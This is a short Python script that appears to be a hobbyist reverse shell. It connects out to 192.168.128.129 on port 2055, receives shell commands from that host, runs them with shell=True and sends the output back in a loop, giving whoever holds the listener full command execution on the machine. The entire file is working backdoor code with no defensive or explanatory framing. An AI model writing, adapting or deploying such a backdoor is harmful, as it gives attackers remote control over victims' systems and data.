#!usr/bin/env python3
import socket
import subprocess

def execute_sys_com(command):
	return subprocess.check_output(command, shell=True)


con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
con.connect(("192.168.128.129",2055))
#con.send("\n[+] Connection Established.\n")
suc ='success'

def execute():
	while True:
		command = con.recv(1024).decode()
		#print(command)
		command_result = execute_sys_com(command)
		#print(type(command_result))
		#print(command_result)
		con.send(bytes(command_result))
		con.send(suc.encode())
		execute()


execute() 

con.close()